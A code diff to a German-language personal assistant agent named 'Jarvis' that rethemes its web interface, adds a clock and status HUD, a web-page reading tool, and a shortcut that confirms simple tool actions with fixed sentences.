+                  margin-bottom:8px;box-shadow:0 0 8px var(--akzent)}
+.hud-ecke.rechts::before{margin-left:auto}
+.hud-ecke a{color:inherit;text-decoration:none}
+.hud-ecke a:hover{color:var(--kupfer)}
 .zustandstext{font-size:12px;letter-spacing:.22em;text-transform:uppercase;
               color:var(--grau);text-align:center;min-height:16px}
 body[data-zustand="wach"] .zustandstext{color:var(--akzent)}
@@ -7689,7 +8100,7 @@ body[data-zustand="wach"] .zustandstext{color:var(--akzent)}
 .tippen input{flex:1;background:var(--panel);border:1px solid var(--rand-hell);
               border-radius:11px;padding:12px 15px;color:var(--text);
               font-family:inherit;font-size:15px}
-.tippen button{background:var(--akzent);color:#1A0E08;border-radius:11px;
+.tippen button{background:var(--akzent);color:#02121C;border-radius:11px;
                padding:12px 20px;font-weight:700}
 
 /* ---- Freigabe ---- */
@@ -7698,9 +8109,9 @@ body[data-zustand="wach"] .zustandstext{color:var(--akzent)}
 .schleier.zeigen{display:grid}
 .frage{background:var(--panel);border:1px solid var(--akzent);border-radius:16px;
        max-width:620px;width:100%;overflow:hidden;
-       box-shadow:0 30px 90px -24px rgba(232,98,44,.5)}
+       box-shadow:0 30px 90px -24px rgba(58,209,255,.5)}
 .frage .kopf{display:flex;align-items:center;gap:12px;padding:13px 20px;
-             background:rgba(232,98,44,.12);border-bottom:1px solid var(--rand)}
+             background:rgba(58,209,255,.12);border-bottom:1px solid var(--rand)}
 .frage .kopf h2{font-size:12px;letter-spacing:.18em;text-transform:uppercase;
                 color:var(--akzent);font-weight:700}
 .frage .rest{margin-left:auto;font-family:var(--mono);font-size:12px;color:var(--grau)}
@@ -7714,7 +8125,7 @@ body[data-zustand="wach"] .zustandstext{color:var(--akzent)}
 .frage .sagen b{color:var(--akzent)}
 .frage .knoepfe{display:flex;gap:11px;padding:12px 20px 20px}
 .frage .knoepfe button{flex:1;padding:15px;border-radius:10px;font-weight:700;font-size:16px}
-.frage .ja{background:var(--akzent);color:#1A0E08}
+.frage .ja{background:var(--akzent);color:#02121C}
 .frage .nein{background:var(--tief);border:1px solid var(--rand-hell);color:var(--text)}
 .frage{max-height:92vh;overflow-y:auto}
 .frage input{width:100%;padding:13px 14px;border-radius:9px;font:14px var(--mono);
@@ -7724,6 +8135,7 @@ body[data-zustand="wach"] .zustandstext{color:var(--akzent)}
 .frage .meldung.fehler{color:var(--rot)}
 
 @media(max-width:640px){
+  .hud-ecke{display:none}
   .ticker{gap:12px;padding:8px 12px;font-size:10px}
   .ticker .rechts{width:100%;margin-left:0;justify-content:flex-start}
   .zahl{padding:9px 10px}.zahl .wert{font-size:15px}
@@ -7746,10 +8158,33 @@ body[data-zustand="wach"] .zustandstext{color:var(--akzent)}
 </div>
 
 <main>
+  <div class="hud-ecke links">
+    <div class="hud-wert" id="uhr">--:--</div>
+    <div id="datum"></div>
+    <div id="hudGehirn"></div>
+  </div>
+  <div class="hud-ecke rechts">
+    <div class="hud-wert"><a href="/autopilot" data-seite target="_blank" rel="noopener"
+         id="hudAufgaben">–</a></div>
+    <div>Heute zu tun</div>
+    <div id="hudSystem">Online</div>
+  </div>
   <div class="kugel" id="kugel" role="button" tabindex="0"
        title="Antippen weckt Jarvis auch ohne Weckwort">
     <span class="ring"></span><span class="ring ring2"></span><span class="ring ring3"></span>
     <span class="welle"></span><span class="welle w2"></span><span class="welle w3"></span>
+    <svg class="hud hud1" viewBox="0 0 200 200" aria-hidden="true">
+      <circle cx="100" cy="100" r="97" fill="none" stroke="currentColor" stroke-width="1"
+              stroke-dasharray="1 5"/>
+      <circle cx="100" cy="100" r="90" fill="none" stroke="currentColor" stroke-width="3"
+              stroke-dasharray="46 14" opacity=".55"/>
+    </svg>
+    <svg class="hud hud2" viewBox="0 0 200 200" aria-hidden="true">
+      <circle cx="100" cy="100" r="81" fill="none" stroke="currentColor" stroke-width="1.6"
+              stroke-dasharray="120 40 20 40" opacity=".75"/>
+      <circle cx="100" cy="100" r="73" fill="none" stroke="currentColor" stroke-width=".8"
+              stroke-dasharray="2 3" opacity=".5"/>
+    </svg>
     <span class="kern"></span>
   </div>
   <div class="zustandstext" id="zustandstext">Mikrofon wird gefragt …</div>
@@ -8145,16 +8580,31 @@ body[data-zustand="wach"] .zustandstext{color:var(--akzent)}
       el("lage").textContent = a.text || "Kein Stand abrufbar.";
     }).catch(function () { el("lage").textContent = "Server antwortet nicht."; });
   }
+  function uhrStellen() {
+    var jetzt = new Date();
+    el("uhr").textContent = ("0" + jetzt.getHours()).slice(-2) + ":" +
+                            ("0" + jetzt.getMinutes()).slice(-2);
+    el("datum").textContent = jetzt.toLocaleDateString("de-AT", {
+      weekday: "long", day: "numeric", month: "long"});
+  }
+  uhrStellen();
+  setInterval(uhrStellen, 15000);
+
   function zustandHolen() {
     holen("/api/zustand").then(function (a) {
       el("pkt").className = "pkt " + (a.einsatzbereit ? "an" : "aus");
       if (a.aufgaben) { el("zuTunLink").textContent = "Heute zu tun (" + a.aufgaben + ")"; }
+      el("hudAufgaben").textContent = String(a.aufgaben || 0);
+      var gehirn = Object.keys(a.dienste || {}).filter(function (k) {
+        return a.dienste[k] && ["Claude", "Gratis-Dienst", "Lokales Modell"].indexOf(k) >= 0;
+      })[0];
+      el("hudGehirn").textContent = "Gehirn: " + (gehirn || "fehlt");
       el("pkt").title = a.einsatzbereit ? a.werkzeuge + " Werkzeuge bereit"
                                         : "Kein Anthropic-Schlüssel";
       if (!a.einsatzbereit) {
         el("schluesselDialog").classList.add("zeigen");
-        el("antwort").textContent = "Es ist kein Anthropic-Schlüssel hinterlegt. " +
-          "Ohne ihn kann ich nicht denken.";
+        el("antwort").textContent = "Ich habe noch kein Gehirn. Trag im Fenster einen Gratis-Schlüssel ein, " +
+          "dann denke ich mit.";
         el("antwort").className = "antwort fehler";
       }
     }).catch(function () {});
@@ -8272,12 +8722,12 @@ PROTOKOLL_HTML = r"""<!DOCTYPE html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="theme-color" content="#08090B">
+<meta name="theme-color" content="#03080F">
 <link rel="icon" href="/symbol.svg" type="image/svg+xml">
 <title>Jarvis Protokoll</title>
 <style>
-:root{--grund:#08090B;--panel:#0F1113;--rand:#1C1F23;--akzent:#E8622C;
-  --kupfer:#F0A882;--text:#F2EFEA;--gedaempft:#A0A6AC;--grau:#7E858C;
+:root{--grund:#03080F;--panel:#071420;--rand:#0E2A3C;--akzent:#3AD1FF;
+  --kupfer:#A6ECFF;--text:#E4F7FF;--gedaempft:#8DB4C6;--grau:#5D8799;
   --gruen:#4CC38A;--rot:#E5484D;
   --sans:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;
   --mono:ui-monospace,"SF Mono",Menlo,monospace}
@@ -8285,7 +8735,7 @@ PROTOKOLL_HTML = r"""<!DOCTYPE html>
 body{background:var(--grund);color:var(--text);font-family:var(--sans);
   -webkit-font-smoothing:antialiased;padding:0 0 60px}
 header{padding:18px 20px;border-bottom:1px solid var(--rand);
-  background:linear-gradient(90deg,rgba(232,98,44,.13),transparent 68%)}
+  background:linear-gradient(90deg,rgba(58,209,255,.13),transparent 68%)}
 header h1{font-size:18px;font-weight:600}
 header p{font-size:12px;color:var(--grau);margin-top:4px;letter-spacing:.06em}
 .leiste{display:flex;gap:8px;flex-wrap:wrap;padding:14px 20px;align-items:center}
@@ -8408,12 +8858,12 @@ AUTOPILOT_HTML = r"""<!DOCTYPE html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="theme-color" content="#08090B">
+<meta name="theme-color" content="#03080F">
 <link rel="icon" href="/symbol.svg" type="image/svg+xml">
 <title>Heute zu tun</title>
 <style>
-:root{--grund:#08090B;--panel:#0F1113;--tief:#0A0D14;--rand:#1C1F23;--rand-hell:#2A3036;
-  --akzent:#E8622C;--kupfer:#F0A882;--text:#F2EFEA;--gedaempft:#A0A6AC;--grau:#7E858C;
+:root{--grund:#03080F;--panel:#071420;--tief:#050D16;--rand:#0E2A3C;--rand-hell:#16425C;
+  --akzent:#3AD1FF;--kupfer:#A6ECFF;--text:#E4F7FF;--gedaempft:#8DB4C6;--grau:#5D8799;
   --gruen:#4CC38A;--rot:#E5484D;
   --sans:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;
   --mono:ui-monospace,"SF Mono",Menlo,monospace}
@@ -8421,7 +8871,7 @@ AUTOPILOT_HTML = r"""<!DOCTYPE html>
 body{background:var(--grund);color:var(--text);font-family:var(--sans);
   -webkit-font-smoothing:antialiased;padding:0 0 60px}
 header{padding:18px 20px;border-bottom:1px solid var(--rand);
-  background:linear-gradient(90deg,rgba(232,98,44,.13),transparent 68%)}
+  background:linear-gradient(90deg,rgba(58,209,255,.13),transparent 68%)}
 header h1{font-size:18px;font-weight:600}
 header p{font-size:12px;color:var(--grau);margin-top:4px;letter-spacing:.04em}
 main{max-width:860px;margin:0 auto;padding:16px 20px}
@@ -8439,7 +8889,7 @@ textarea{font:13px/1.5 var(--sans);min-height:120px;resize:vertical;margin-top:8
 button,.knopf{font:inherit;font-size:13px;cursor:pointer;border-radius:8px;padding:8px 14px;
   border:1px solid var(--rand-hell);background:var(--tief);color:var(--text);
   text-decoration:none;display:inline-block}
-button.haupt{background:var(--akzent);border-color:var(--akzent);color:#1A0E08;font-weight:700}
+button.haupt{background:var(--akzent);border-color:var(--akzent);color:#02121C;font-weight:700}
 button:disabled{opacity:.5;cursor:default}
 .reihe{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px;align-items:center}
 .art{font-size:10px;letter-spacing:.12em;text-transform:uppercase;color:var(--kupfer)}
@@ -10136,9 +10586,11 @@ MAX_KOERPER = 512 * 1024
 # Fehler in die Konsole. Ein kleines SVG kostet nichts und räumt das weg.
 SYMBOL_SVG = (
     '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">'
-    '<rect width="64" height="64" rx="14" fill="#0F1113"/>'
-    '<circle cx="32" cy="32" r="17" fill="none" stroke="#E8622C" stroke-width="5"/>'
-    '<circle cx="32" cy="32" r="6" fill="#E8622C"/></svg>')
+    '<rect width="64" height="64" rx="14" fill="#03080F"/>'
+    '<circle cx="32" cy="32" r="21" fill="none" stroke="#3AD1FF" stroke-width="2" '
+    'stroke-dasharray="10 4"/>'
+    '<circle cx="32" cy="32" r="14" fill="none" stroke="#3AD1FF" stroke-width="4"/>'
+    '<circle cx="32" cy="32" r="6" fill="#A6ECFF"/></svg>')
 
 
 def _fuer_skript(wert: str) -> str:
@@ -10447,8 +10899,8 @@ class JarvisWeb:
             if not self.agent.einsatzbereit():
                 return self._antworten(behandler, 200, {
                     "ok": False,
-                    "antwort": "Es ist kein Anthropic-Schlüssel hinterlegt. "
-                               "Ohne ihn kann ich nicht denken."})
+                    "antwort": "Ich habe noch kein Gehirn. Trag im Startfenster einen "
+                               "Gratis-Schlüssel ein, dann denke ich mit."})
             # Nur ein Gedanke gleichzeitig: sonst mischen sich zwei Gespräche
             # im selben Verlauf.
             with self._denkt:
@@ -11974,6 +12426,10 @@ class Werkzeuge:
                       "datum": text}, ["zusammenfassung"]),
             werkzeug("rueckblick", "Gibt die Tagesberichte der letzten Tage zurück.",
                      {"tage": ganz}),
+            werkzeug("webseite_lesen",
+                     "Liest eine Webseite und gibt ihren Text, Mailadressen, Telefonnummern "
+                     "und Links zurück. Für jede Frage zu einer Adresse oder Seite.",
+                     {"adresse": text, "frage": text}, ["adresse"]),
             werkzeug("autopilot_starten",
                      "Startet den Autopilot jetzt: neue Betriebe finden und Anruf-Skripte "
                      "schreiben, Nachfassen, Antworten auf wichtige Mails entwerfen, "
@@ -12225,7 +12681,7 @@ class Werkzeuge:
 
     # -- Freigabe -----------------------------------------------------------
 
-    def braucht_freigabe(self, name: str) -> bool:
+    def braucht_freigabe(self, name: str, argumente: dict = None) -> bool:
         """Muss vor diesem Werkzeug gefragt werden?"""
         if self.mcp.ist_mcp_werkzeug(name):
             return self.mcp.braucht_freigabe(name)
@@ -12273,7 +12729,7 @@ class Werkzeuge:
                                               "unbekannt")
             return ergebnis
 
-        if self.braucht_freigabe(name):
+        if self.braucht_freigabe(name, argumente):
             entscheidung = self._freigabe(name, argumente)
             if not entscheidung.get("erlaubt"):
                 ergebnis = {"ok": False, "abgebrochen": True,
@@ -12357,6 +12813,8 @@ class Werkzeuge:
                 a.get("offen", ""), a.get("datum", ""))
         if name == "rueckblick":
             return {"ok": True, "text": self.recall.rueckblick(int(a.get("tage") or 7))}
+        if name == "webseite_lesen":
+            return webseite_lesen(a.get("adresse", ""), a.get("frage", ""))
         if name == "autopilot_starten":
             return self.autopilot.laufen(self.agent)
         if name == "heute_zu_tun":
@@ -12724,6 +13182,44 @@ def json_aus_text(rohtext: str):
     return None
 
 
+# Werkzeuge, deren eigene Meldung als Antwort genügt ("Notiz gespeichert.").
+# Alles, was gelesen und zusammengefasst werden muss, gehört nicht hierher.
+DIREKT_ANTWORT = {
+    "notiz_speichern", "punkt_anlegen", "punkt_erledigen", "kontakt_anlegen",
+    "erinnerung_anlegen", "erinnerung_erledigen", "kennzahl_setzen", "lead_anlegen",
+    "lead_weiterstufen", "buchung_eintragen", "termin_anlegen", "programm_oeffnen",
+    "autopilot_starten", "heute_zu_tun", "punkte_offen", "mail_senden",
+    "nachricht_senden", "sms_senden", "anrufen", "tagesbericht_speichern",
+    "fixkosten_anlegen", "routine_anlegen",
+}
+
+
+# Werkzeuge, die als Meldung nur den Inhalt zurückgeben ("Berger anrufen"),
+# bekommen für die Direktantwort einen ganzen Satz.
+DIREKT_SAETZE = {
+    "notiz_speichern": "Notiert: {text}",
+    "punkt_anlegen": "Offener Punkt angelegt: {text}",
+    "kontakt_anlegen": "Kontakt {name} ist angelegt.",
+    "kennzahl_setzen": "{name} ist festgehalten.",
+    "tagesbericht_speichern": "Der Tagesbericht ist gespeichert.",
+}
+
+
+def direkt_satz(name: str, argumente: dict, ergebnis: dict) -> str:
+    """Der Satz, mit dem Jarvis eine einfache Aktion selbst bestätigt - oder ''."""
+    if name not in DIREKT_ANTWORT or not ergebnis.get("ok"):
+        return ""
+    vorlage = DIREKT_SAETZE.get(name)
+    if vorlage:
+        satz = vorlage
+        for feld in ("text", "name"):
+            satz = satz.replace("{%s}" % feld, str((argumente or {}).get(feld, "")).strip())
+        if name == "punkt_anlegen" and (argumente or {}).get("faellig"):
+            satz += " (fällig %s)" % str(argumente["faellig"]).strip()
+        return satz if satz.endswith((".", "!", "?", ")")) else satz + "."
+    return str(ergebnis.get("text") or "").strip()
+
+
 class JarvisAgent:
     """Die Denkschleife: fragt Claude, führt Werkzeuge aus, antwortet gesprochen."""
 
@@ -12774,8 +13270,8 @@ class JarvisAgent:
         """
         if not self.einsatzbereit():
             return {"ok": False,
-                    "fehler": "Es ist kein Anthropic-Schlüssel hinterlegt. Starte die "
-                              "Einrichtung mit: python3 jarvis.py einrichten"}
+                    "fehler": "Es ist noch kein Gehirn eingerichtet. Trag im Browser "
+                              "einen Gratis-Schlüssel ein (localhost:8765)."}
         if not ANTHROPIC_API_KEY:
             if freier_dienst_aktiv():
                 return freier_dienst_anfragen(koerper)
@@ -12906,8 +13402,8 @@ class JarvisAgent:
         if not eingabe:
             return ""
         if not self.einsatzbereit():
-            return ("Es ist kein Anthropic-Schlüssel hinterlegt. Starte einmal die "
-                    "Einrichtung, dann kann ich dir antworten.")
+            return ("Es ist noch kein Gehirn eingerichtet. Trag im Browser einen "
+                    "Gratis-Schlüssel ein, dann kann ich dir antworten.")
 
         if protokollieren:
             self.memory.verlauf_anhaengen("user", eingabe)
@@ -12942,12 +13438,18 @@ class JarvisAgent:
                 return text or "Dazu habe ich nichts zu sagen."
 
             ergebnisse = []
+            direkt = []
             for aufruf in werkzeugaufrufe:
                 name = aufruf.get("name", "")
                 argumente = aufruf.get("input") or {}
                 print("[werkzeug] %s %s" % (name, json.dumps(argumente,
                                                              ensure_ascii=False)[:200]))
                 ergebnis = self.tools.run(name, argumente)
+                satz = direkt_satz(name, argumente, ergebnis) if direkt is not None else ""
+                if satz:
+                    direkt.append(satz)
+                else:
+                    direkt = None
                 try:
                     text = json.dumps(ergebnis, ensure_ascii=False, default=str)[:6000]
                 except (TypeError, ValueError):
@@ -12957,6 +13459,17 @@ class JarvisAgent:
                                    "is_error": not bool(ergebnis.get("ok"))})
             self.verlauf.append({"role": "user", "content": ergebnisse})
             self._verlauf_kuerzen()
+
+            # Einfache Aktionen sagen selbst, was passiert ist. Bei den langsamen
+            # Gratis-Gehirnen spart das die zweite Runde - Jarvis handelt, statt
+            # das Ergebnis noch einmal umformulieren zu lassen.
+            if direkt and not ANTHROPIC_API_KEY and len(" ".join(direkt)) <= 400:
+                text = " ".join(direkt)
+                self.verlauf.append({"role": "assistant",
+                                     "content": [{"type": "text", "text": text}]})
+                if protokollieren:
+                    self.memory.verlauf_anhaengen("assistant", text)
+                return text
 
         return ("Ich habe es %d Mal versucht und komme nicht weiter. Sag mir bitte "
                 "genauer, was du brauchst." % MAX_RUNDEN)
@@ -12971,7 +13484,7 @@ class JarvisAgent:
         Fachkraft den Kontext des Chefs zumüllen.
         """
         if not self.einsatzbereit():
-            return ("Es ist kein Anthropic-Schlüssel hinterlegt.")
+            return ("Es ist noch kein Gehirn eingerichtet.")
 
         katalog = self.tools.katalog()
         if werkzeugnamen:
@@ -13089,9 +13602,9 @@ class JarvisAgent:
     @staticmethod
     def _briefing_ohne_claude(bausteine: str, morgens: bool) -> str:
         """Rückfallebene ohne Schlüssel: die nackten Fakten, nichts Erfundenes."""
-        kopf = ("Guten Morgen. Ohne Anthropic-Schlüssel kann ich nur die nackten Zahlen "
+        kopf = ("Guten Morgen. Ohne eingerichtetes Gehirn kann ich nur die nackten Zahlen "
                 "vorlesen." if morgens else
-                "Feierabend. Ohne Anthropic-Schlüssel kann ich nur die nackten Zahlen "
+                "Feierabend. Ohne eingerichtetes Gehirn kann ich nur die nackten Zahlen "
                 "vorlesen.")
         return "%s\n%s" % (kopf, bausteine)
 
@@ -13179,8 +13692,8 @@ def dauerbetrieb():
         return chatbetrieb(agent, stimme)
 
     if not agent.einsatzbereit():
-        stimme.sprich("Es ist kein Anthropic-Schlüssel hinterlegt. Starte bitte einmal "
-                      "die Einrichtung.")
+        stimme.sprich("Es ist noch kein Gehirn eingerichtet. Öffne Jarvis im Browser "
+                      "und trag einen Gratis-Schlüssel ein.")
         print("Starte die Einrichtung mit: python3 jarvis.py einrichten")
 
     stimme.sprich("Ich bin da. Sag Hey Jarvis, wenn du etwas brauchst.")
@@ -13757,8 +14270,8 @@ def hauptprogramm(argumente=None) -> int:
         # Browser ein. Eine Einrichtung im Terminal, die den Server gar nicht
         # erst startet, lässt den Nutzer vor einer toten Adresse stehen.
         if not ANTHROPIC_API_KEY:
-            print("Noch kein Anthropic-Schlüssel - den trägst du gleich im "
-                  "Browser ein.")
+            print("Noch kein Gehirn eingerichtet - das machst du gleich im "
+                  "Browser.")
         return webbetrieb(argumente[1:] if argumente else [])
     elif modus in ("hoeren", "hören", "dauerbetrieb", "sprechen"):
         if not EINRICHTUNG_FERTIG and not ANTHROPIC_API_KEY:
